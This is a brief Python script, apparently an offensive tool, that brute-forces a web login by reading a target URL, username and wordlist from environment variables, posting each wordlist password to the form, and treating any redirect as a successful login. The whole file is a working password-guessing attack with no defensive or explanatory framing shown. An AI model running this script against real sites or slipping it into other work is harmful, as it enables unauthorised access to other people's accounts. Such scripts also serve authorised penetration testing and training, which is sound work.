import os
import requests

target_url_env = os.getenv('TARGET', '')
username_env = os.getenv('USERNAME', '')
wordlist_env = os.getenv('WORDLIST', '')

wordlist = open(wordlist_env , "r")

for password in wordlist.read().splitlines():
    r = requests.post(target_url_env, data={'username': username_env, 'password': password})
    
    if len(r.history) > 0:
        print(f'Password found for {username_env}: {password}')
        exit(0)

print('No password found')
exit(1)
